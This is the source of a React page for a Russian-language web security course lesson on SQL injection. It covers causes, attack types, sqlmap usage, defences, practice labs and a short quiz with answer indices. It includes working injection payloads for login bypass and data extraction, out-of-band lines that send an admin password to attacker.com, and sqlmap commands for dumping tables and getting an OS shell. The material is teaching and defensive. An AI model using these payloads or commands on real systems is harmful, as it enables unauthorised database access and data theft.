'use client';

import React from 'react';
import { ContentPageLayout } from '@/components/content/ContentPageLayout';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { ExternalLink, AlertTriangle } from 'lucide-react';
import { QuizItem } from '@/components/content/QuizItem';

const P: React.FC<React.HTMLAttributes<HTMLParagraphElement>> = ({ children, ...props }) => (
  <p className="mb-3 leading-relaxed" {...props}>{children}</p>
);

const H2: React.FC<React.HTMLAttributes<HTMLHeadingElement>> = ({ children, ...props }) => (
  <h2 className="text-2xl font-bold mb-4 mt-6" {...props}>{children}</h2>
);

const H3: React.FC<React.HTMLAttributes<HTMLHeadingElement>> = ({ children, ...props }) => (
  <h3 className="text-xl font-semibold mb-3 mt-4" {...props}>{children}</h3>
);

export default function Lesson4Page() {
  const quizQuestions = [
    {
      question: "Что такое SQL Injection?",
      answers: [
        "Внедрение HTML-кода в веб-страницу",
        "Внедрение вредоносного SQL-кода для манипуляции базой данных",
        "Внедрение JavaScript-кода",
        "Внедрение CSS-стилей"
      ],
      correctAnswerIndex: 1
    },
    {
      question: "Какой тип SQL Injection получает данные сразу в том же канале?",
      answers: [
        "Inferential SQL Injection",
        "Out-of-band SQL Injection",
        "In-band SQL Injection",
        "Blind SQL Injection"
      ],
      correctAnswerIndex: 2
    },
    {
      question: "Что такое Blind SQL Injection?",
      answers: [
        "Атака, где данные передаются по другому каналу",
        "Атака без прямого вывода ошибок БД",
        "Атака только на MySQL",
        "Атака только на SELECT запросы"
      ],
      correctAnswerIndex: 1
    },
    {
      question: "Какая команда sqlmap используется для перечисления баз данных?",
      answers: [
        "--tables",
        "--dump",
        "--dbs",
        "--columns"
      ],
      correctAnswerIndex: 2
    },
    {
      question: "Что является основной защитой от SQL Injection?",
      answers: [
        "Использование WAF",
        "Prepared Statements с параметризованными запросами",
        "Шифрование данных",
        "Использование HTTPS"
      ],
      correctAnswerIndex: 1
    },
    {
      question: "Какой символ часто используется для комментариев в SQL Injection?",
      answers: [
        "//",
        "#",
        "-- (два дефиса)",
        "/* */"
      ],
      correctAnswerIndex: 2
    },
    {
      question: "Что такое Union-based SQL Injection?",
      answers: [
        "Использование UNION для объединения результатов запросов",
        "Использование JOIN операций",
        "Использование вложенных запросов",
        "Использование хранимых процедур"
      ],
      correctAnswerIndex: 0
    },
    {
      question: "Какая уязвимость может возникнуть при использовании Second-order SQL Injection?",
      answers: [
        "SQL-код выполняется сразу при вводе",
        "SQL-код сохраняется и выполняется позже в другом контексте",
        "SQL-код передается по DNS",
        "SQL-код выполняется в браузере"
      ],
      correctAnswerIndex: 1
    }
  ];

  return (
    <ContentPageLayout
      title="Урок 4: SQL Injection"
      subtitle="Подробное изучение атак SQL Injection, типов, методов эксплуатации и защиты"
    >
      <div className="space-y-6">
        <Card className="border-destructive/50 bg-destructive/5">
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <AlertTriangle className="h-5 w-5 text-destructive" />
              Важное предупреждение
            </CardTitle>
          </CardHeader>
          <CardContent>
            <P>
              SQL Injection — одна из самых опасных и распространенных уязвимостей веб-приложений. 
              Она может привести к полной компрометации базы данных и всего приложения. 
              Все примеры в этом уроке предназначены только для образовательных целей в контролируемых средах.
            </P>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Что такое SQL Injection?</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <P>
              <strong>SQL Injection (SQLi)</strong> — это уязвимость безопасности веб-приложений, которая позволяет 
              злоумышленнику внедрять вредоносный SQL-код в запросы к базе данных. Это происходит, когда пользовательский 
              ввод неправильно фильтруется или экранируется перед использованием в SQL-запросе.
            </P>
            <P>
              Успешная SQL Injection атака может позволить злоумышленнику:
            </P>
            <ul className="list-disc pl-6 mb-3 space-y-1">
              <li>Читать конфиденциальные данные из базы данных</li>
              <li>Изменять данные (вставка, обновление, удаление)</li>
              <li>Выполнять административные операции с БД</li>
              <li>Восстанавливать содержимое файлов в СУБД</li>
              <li>В некоторых случаях выполнять команды на уровне операционной системы</li>
            </ul>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>5 главных причин SQL Injection</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div>
              <H3>1. Недостаточная валидация входных данных</H3>
              <P>
                Приложение не проверяет и не санитизирует данные, полученные от пользователя, перед их использованием в SQL-запросе.
              </P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`// Уязвимый код (PHP)
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = $id";
$result = mysqli_query($conn, $query);

// Атака: ?id=1 OR 1=1
// Запрос: SELECT * FROM users WHERE id = 1 OR 1=1`}
                </pre>
              </div>
            </div>

            <div>
              <H3>2. Динамическое построение SQL-запросов</H3>
              <P>
                Использование конкатенации строк для создания SQL-запросов вместо параметризованных запросов.
              </P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`// Уязвимый код (Python)
username = request.form['username']
password = request.form['password']
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
cursor.execute(query)

// Атака: username = admin'--
// Запрос: SELECT * FROM users WHERE username='admin'--' AND password='...'`}
                </pre>
              </div>
            </div>

            <div>
              <H3>3. Использование привилегированных учетных записей БД</H3>
              <P>
                Приложение подключается к базе данных с учетной записью, имеющей избыточные права (например, root или sa).
              </P>
              <ul className="list-disc pl-6 mb-3 space-y-1">
                <li>Увеличивается урон при успешной атаке</li>
                <li>Возможность выполнения административных команд</li>
                <li>Доступ к системным таблицам и процедурам</li>
              </ul>
            </div>

            <div>
              <H3>4. Отображение подробных сообщений об ошибках</H3>
              <P>
                Вывод детальных ошибок базы данных пользователю помогает злоумышленникам понять структуру БД.
              </P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`// Пример ошибки, помогающей атакующему:
You have an error in your SQL syntax; check the manual that corresponds to your 
MySQL server version for the right syntax to use near ''admin''' at line 1

// Злоумышленник узнает:
- Используется MySQL
- Синтаксис запроса
- Точка внедрения кода`}
                </pre>
              </div>
            </div>

            <div>
              <H3>5. Отсутствие дополнительных уровней защиты</H3>
              <P>
                Нет Web Application Firewall (WAF), системы обнаружения вторжений (IDS) или других механизмов защиты.
              </P>
              <ul className="list-disc pl-6 mb-3 space-y-1">
                <li>Отсутствие мониторинга подозрительных запросов</li>
                <li>Нет ограничения частоты запросов (rate limiting)</li>
                <li>Отсутствие логирования подозрительной активности</li>
              </ul>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Типы SQL Injection</CardTitle>
          </CardHeader>
          <CardContent className="space-y-6">
            <div>
              <H2>1. In-band SQL Injection</H2>
              <P>
                <strong>In-band SQLi</strong> — самый распространенный тип, где злоумышленник использует тот же 
                канал связи для запуска атаки и сбора результатов.
              </P>

              <H3>1.1 Error-based SQL Injection</H3>
              <P>
                Использует сообщения об ошибках СУБД для получения информации о структуре базы данных.
              </P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`// Пример атаки:
?id=1' AND (SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT version()), 
0x23, FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x) y)--

// Получаем версию MySQL через сообщение об ошибке`}
                </pre>
              </div>

              <H3>1.2 Union-based SQL Injection</H3>
              <P>
                Использует оператор UNION для объединения результатов вредоносного запроса с легитимным.
              </P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`// Определение количества столбцов:
?id=1' ORDER BY 1--
?id=1' ORDER BY 2--
?id=1' ORDER BY 3--  (ошибка = 2 столбца)

// Получение данных:
?id=1' UNION SELECT username, password FROM users--

// Результат может содержать данные из таблицы users`}
                </pre>
              </div>
            </div>

            <div>
              <H2>2. Inferential SQL Injection (Blind SQLi)</H2>
              <P>
                <strong>Blind SQL Injection</strong> происходит, когда приложение уязвимо, но HTTP-ответы не содержат 
                результатов SQL-запроса или ошибок базы данных.
              </P>

              <H3>2.1 Boolean-based Blind SQL Injection</H3>
              <P>
                Отправка SQL-запросов, которые заставляют приложение возвращать разные результаты в зависимости от того, 
                является ли запрос TRUE или FALSE.
              </P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`// Проверка существования таблицы:
?id=1' AND (SELECT COUNT(*) FROM users) > 0--  (страница загружается нормально = TRUE)
?id=1' AND (SELECT COUNT(*) FROM admins) > 0--  (ошибка или пустая страница = FALSE)

// Извлечение данных по одному биту:
?id=1' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a'--
?id=1' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'b'--`}
                </pre>
              </div>

              <H3>2.2 Time-based Blind SQL Injection</H3>
              <P>
                Отправка SQL-запросов, которые заставляют базу данных ждать определенное время перед ответом.
              </P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`// MySQL:
?id=1' AND IF(1=1, SLEEP(5), 0)--  (задержка 5 секунд = TRUE)
?id=1' AND IF(1=2, SLEEP(5), 0)--  (нет задержки = FALSE)

// SQL Server:
?id=1'; IF (1=1) WAITFOR DELAY '00:00:05'--

// PostgreSQL:
?id=1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

// Извлечение данных:
?id=1' AND IF((SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a', SLEEP(5), 0)--`}
                </pre>
              </div>
            </div>

            <div>
              <H2>3. Out-of-band SQL Injection</H2>
              <P>
                <strong>Out-of-band SQLi</strong> используется, когда злоумышленник не может использовать тот же канал 
                для запуска атаки и сбора результатов. Данные извлекаются по альтернативному каналу (DNS, HTTP).
              </P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`// Microsoft SQL Server (xp_dirtree для DNS lookup):
?id=1'; DECLARE @data VARCHAR(1024); SELECT @data = (SELECT password FROM users WHERE username='admin'); 
EXEC('master..xp_dirtree "\\\\' + @data + '.attacker.com\\a"')--

// Oracle (UTL_HTTP для HTTP запроса):
?id=1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/?data='||(SELECT password FROM users WHERE username='admin')) FROM dual--

// MySQL (LOAD_FILE для чтения DNS):
?id=1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users WHERE username='admin'),'.attacker.com\\\\a'))--`}
                </pre>
              </div>
              <P>
                Злоумышленник контролирует attacker.com и получает данные через DNS-запросы или HTTP-логи.
              </P>
            </div>

            <div>
              <H2>4. Second-order SQL Injection</H2>
              <P>
                <strong>Second-order SQLi</strong> происходит, когда вредоносные данные сначала сохраняются приложением, 
                а затем используются в другом SQL-запросе без должной обработки.
              </P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`// Шаг 1: Регистрация пользователя с именем:
username: admin'--

// Код приложения (использует prepared statement):
INSERT INTO users (username, password) VALUES (?, ?)
// Данные сохраняются безопасно: username = "admin'--"

// Шаг 2: Обновление профиля (уязвимый код):
$username = $_SESSION['username'];  // "admin'--"
$query = "UPDATE users SET email='$email' WHERE username='$username'";
// Запрос становится:
UPDATE users SET email='test@test.com' WHERE username='admin'--'

// Результат: обновляется email всех пользователей с username='admin'`}
                </pre>
              </div>
              <P>
                <strong>Характеристики Second-order SQLi:</strong>
              </P>
              <ul className="list-disc pl-6 mb-3 space-y-1">
                <li>Труднее обнаружить, так как внедрение и эксплуатация разделены</li>
                <li>Может обходить некоторые WAF и системы защиты</li>
                <li>Требует понимания логики приложения</li>
                <li>Часто встречается в функциях обновления профиля, комментариев, административных панелях</li>
              </ul>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Инструменты: sqlmap</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <P>
              <strong>sqlmap</strong> — мощный инструмент с открытым исходным кодом для автоматизации обнаружения и 
              эксплуатации SQL Injection уязвимостей.
            </P>

            <H3>Установка</H3>
            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
              <pre className="text-sm">
{`# Linux/Mac:
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python sqlmap.py

# Или через pip:
pip install sqlmap

# Или через apt (Kali Linux):
sudo apt install sqlmap`}
              </pre>
            </div>

            <H3>Основные команды</H3>
            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
              <pre className="text-sm">
{`# Базовое сканирование URL:
sqlmap -u "http://example.com/page?id=1"

# Тестирование с POST данными:
sqlmap -u "http://example.com/login" --data="username=admin&password=pass"

# Использование cookie:
sqlmap -u "http://example.com/profile" --cookie="PHPSESSID=abc123"

# Перечисление баз данных:
sqlmap -u "http://example.com/page?id=1" --dbs

# Перечисление таблиц в базе данных:
sqlmap -u "http://example.com/page?id=1" -D database_name --tables

# Перечисление столбцов в таблице:
sqlmap -u "http://example.com/page?id=1" -D database_name -T users --columns

# Извлечение данных:
sqlmap -u "http://example.com/page?id=1" -D database_name -T users -C username,password --dump

# Автоматический режим (batch):
sqlmap -u "http://example.com/page?id=1" --batch

# Использование уровня и риска:
sqlmap -u "http://example.com/page?id=1" --level=5 --risk=3

# Определение СУБД:
sqlmap -u "http://example.com/page?id=1" --banner

# Получение shell:
sqlmap -u "http://example.com/page?id=1" --os-shell`}
              </pre>
            </div>

            <H3>Опции уровня и риска</H3>
            <ul className="list-disc pl-6 mb-3 space-y-2">
              <li><strong>--level (1-5)</strong>: Количество тестов (1 = базовые, 5 = все возможные)</li>
              <li><strong>--risk (1-3)</strong>: Риск изменения данных (1 = безопасные, 3 = UPDATE/DELETE запросы)</li>
            </ul>

            <H3>Использование с Burp Suite</H3>
            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
              <pre className="text-sm">
{`# 1. Перехватите запрос в Burp
# 2. Сохраните запрос в файл (например, request.txt)
# 3. Используйте sqlmap:
sqlmap -r request.txt --batch --dbs

# Пример файла request.txt:
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=123456`}
              </pre>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Методы защиты от SQL Injection</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div>
              <H3>1. Prepared Statements (Параметризованные запросы)</H3>
              <P><strong>Самый эффективный метод защиты</strong></P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`// PHP (PDO):
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);

// Python (psycopg2):
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))

// Java (JDBC):
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
pstmt.setString(2, password);
ResultSet rs = pstmt.executeQuery();

// Node.js (mysql2):
connection.execute("SELECT * FROM users WHERE username = ? AND password = ?", [username, password])`}
                </pre>
              </div>
            </div>

            <div>
              <H3>2. Stored Procedures (Хранимые процедуры)</H3>
              <P>Безопасны только если не используют динамический SQL</P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`-- Создание безопасной stored procedure (SQL Server):
CREATE PROCEDURE GetUser
    @username VARCHAR(50),
    @password VARCHAR(50)
AS
BEGIN
    SELECT * FROM users WHERE username = @username AND password = @password
END

// Вызов из приложения (C#):
SqlCommand cmd = new SqlCommand("GetUser", connection);
cmd.CommandType = CommandType.StoredProcedure;
cmd.Parameters.AddWithValue("@username", username);
cmd.Parameters.AddWithValue("@password", password);`}
                </pre>
              </div>
            </div>

            <div>
              <H3>3. Белый список входных данных (Input Validation)</H3>
              <P>Валидация и санитизация пользовательского ввода</P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`// Пример валидации (PHP):
// Только цифры для ID:
if (!ctype_digit($id)) {
    die("Invalid ID");
}

// Белый список для сортировки:
$allowed_columns = ['name', 'email', 'created_at'];
if (!in_array($sort_by, $allowed_columns)) {
    $sort_by = 'name';
}

// Регулярные выражения для email:
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die("Invalid email");
}`}
                </pre>
              </div>
            </div>

            <div>
              <H3>4. Экранирование специальных символов</H3>
              <P>Последняя линия защиты (не основная!)</P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`// PHP:
$username = mysqli_real_escape_string($conn, $_POST['username']);

// Python (обратите внимание: не рекомендуется, используйте параметризованные запросы):
username = pymysql.escape_string(username)

// Важно: экранирование НЕ заменяет параметризованные запросы!`}
                </pre>
              </div>
            </div>

            <div>
              <H3>5. Принцип наименьших привилегий</H3>
              <ul className="list-disc pl-6 mb-3 space-y-1">
                <li>Приложение должно подключаться к БД с минимальными необходимыми правами</li>
                <li>Отдельные учетные записи для чтения и записи</li>
                <li>Запрет прямого доступа к системным таблицам</li>
                <li>Отключение опасных функций (xp_cmdshell, LOAD_FILE и т.д.)</li>
              </ul>
            </div>

            <div>
              <H3>6. Web Application Firewall (WAF)</H3>
              <P>Дополнительный уровень защиты:</P>
              <ul className="list-disc pl-6 mb-3 space-y-1">
                <li>ModSecurity (open source)</li>
                <li>Cloudflare WAF</li>
                <li>AWS WAF</li>
                <li>Imperva WAF</li>
              </ul>
            </div>

            <div>
              <H3>7. Мониторинг и логирование</H3>
              <ul className="list-disc pl-6 mb-3 space-y-1">
                <li>Логирование всех SQL-запросов</li>
                <li>Мониторинг подозрительных паттернов (UNION, OR 1=1, SLEEP())</li>
                <li>Настройка алертов на аномальную активность БД</li>
                <li>Регулярные аудиты безопасности</li>
              </ul>
            </div>

            <div>
              <H3>8. Отключение детальных сообщений об ошибках</H3>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`// Production настройки (PHP):
ini_set('display_errors', 0);
error_reporting(0);

// Показывать общие сообщения:
try {
    // SQL запрос
} catch (Exception $e) {
    // Логировать ошибку в файл
    error_log($e->getMessage());
    // Показать пользователю:
    die("An error occurred. Please try again later.");
}`}
                </pre>
              </div>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Практические лаборатории</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <P>
              Рекомендуемые платформы для практики SQL Injection:
            </P>
            <ul className="list-disc pl-6 space-y-2">
              <li>
                <strong>PortSwigger Web Security Academy - SQL Injection</strong>
                <a 
                  href="https://portswigger.net/web-security/sql-injection" 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="inline-flex items-center ml-2 text-primary hover:underline"
                >
                  Перейти к лабораториям <ExternalLink className="ml-1 h-4 w-4" />
                </a>
                <div className="ml-4 mt-2 text-sm text-muted-foreground">
                  Рекомендуемые лабораторные работы:
                  <ol className="list-decimal pl-6 mt-2 space-y-1">
                    <li>SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</li>
                    <li>SQL injection vulnerability allowing login bypass</li>
                    <li>SQL injection UNION attack, determining the number of columns</li>
                    <li>SQL injection UNION attack, finding a column containing text</li>
                    <li>SQL injection UNION attack, retrieving data from other tables</li>
                    <li>SQL injection UNION attack, retrieving multiple values in a single column</li>
                    <li>SQL injection attack, querying the database type and version on Oracle</li>
                    <li>SQL injection attack, querying the database type and version on MySQL and Microsoft</li>
                    <li>SQL injection attack, listing the database contents on non-Oracle databases</li>
                    <li>SQL injection attack, listing the database contents on Oracle</li>
                    <li>Blind SQL injection with conditional responses</li>
                    <li>Blind SQL injection with time delays and information retrieval</li>
                  </ol>
                </div>
              </li>
              <li><strong>DVWA (Damn Vulnerable Web Application)</strong> - SQL Injection модуль</li>
              <li><strong>SQLi Labs</strong> - Специализированная платформа для изучения SQLi</li>
              <li><strong>HackTheBox</strong> - Machines с SQL Injection уязвимостями</li>
              <li><strong>TryHackMe</strong> - SQL Injection комнаты</li>
            </ul>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Проверка знаний</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-6">
              {quizQuestions.map((q, index) => (
                <QuizItem
                  key={index}
                  question={q.question}
                  answers={q.answers}
                  correctAnswerIndex={q.correctAnswerIndex}
                />
              ))}
            </div>
          </CardContent>
        </Card>

        <Card className="bg-primary/5 border-primary/20">
          <CardHeader>
            <CardTitle>Заключение</CardTitle>
          </CardHeader>
          <CardContent>
            <P>
              SQL Injection остается одной из наиболее критичных уязвимостей веб-приложений, несмотря на то, 
              что методы защиты хорошо известны. Ключ к предотвращению SQL Injection — <strong>всегда использовать 
              параметризованные запросы</strong> и никогда не доверять пользовательскому вводу.
            </P>
            <P>
              Понимание различных типов SQL Injection, методов эксплуатации и защиты критически важно для 
              любого разработчика или специалиста по безопасности. Регулярное тестирование приложений на 
              наличие SQL Injection должно быть частью процесса разработки.
            </P>
            <P>
              <strong>Помните:</strong> Defense in Depth — используйте множественные уровни защиты!
            </P>
          </CardContent>
        </Card>
      </div>
    </ContentPageLayout>
  );
}
